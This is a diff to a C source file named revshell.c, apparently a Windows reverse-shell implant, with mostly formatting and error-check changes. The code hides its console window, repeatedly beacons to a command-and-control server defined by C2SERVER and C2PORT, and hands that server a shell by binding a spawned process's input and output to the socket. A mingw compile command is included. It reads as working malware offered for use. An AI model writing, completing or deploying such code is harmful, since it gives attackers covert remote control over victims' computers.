@@ -1,21 +1,21 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
-#include <stdio.h>
 #include "revshell.h"
 
 /* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */
 
 int main(int argc, char* argv[])
 {
-	WSADATA wsa;
-	FreeConsole();
+  WSADATA wsa;
 
-	/* initialize win sock version*/
-	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-		exit(0);
+  FreeConsole();
 
-	beacon();
+  /* initialize win sock version*/
+  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+    exit(0);
+
+  beacon();
 }
 
 /* continually beacon the C2 (add random interval) */
@@ -23,31 +23,31 @@ static void beacon()
 {
   SOCKET sock;
   struct sockaddr_in server;
-  char reply_buffer[1024]= { 0 };
+  char reply_buffer[1024]= {0};
   int recv_size;
 
-  while (TRUE)
+  while (1)
     {
       Sleep(5000);
 
-      if ((sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
+      if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
 			    NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
 	{
 	  server.sin_addr.s_addr= inet_addr(C2SERVER);
 	  server.sin_family= AF_INET;
 	  server.sin_port= htons(C2PORT);
 
-	  if (!WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL))
+	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
+	      != SOCKET_ERROR)
 	    {
 	      /* get data from C2 before continuing (add config)*/
-	      if ((recv_size = recv(sock, reply_buffer, 1024, 0)) != SOCKET_ERROR)
+	      if ((recv_size= recv(sock, reply_buffer, 1024, 0)) != SOCKET_ERROR)
 		spawn_shell(sock);
 	    }
 	}
 
       WSACleanup();
       closesocket(sock);
-      continue;
     }
 }
 
@@ -61,7 +61,8 @@ static void spawn_shell(SOCKET sock_pipe)
   si.cb = sizeof(si);
   si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
 
-  /* send stdin, stdout, and stderr of the created process to the socket connection (C2Server) */
+  /* send stdin, stdout, and stderr of the 
+     created process to the socket connection (C2Server) */
   si.hStdInput= si.hStdOutput= si.hStdError= (HANDLE)sock_pipe;
 
   ZeroMemory(&pi, sizeof(pi));
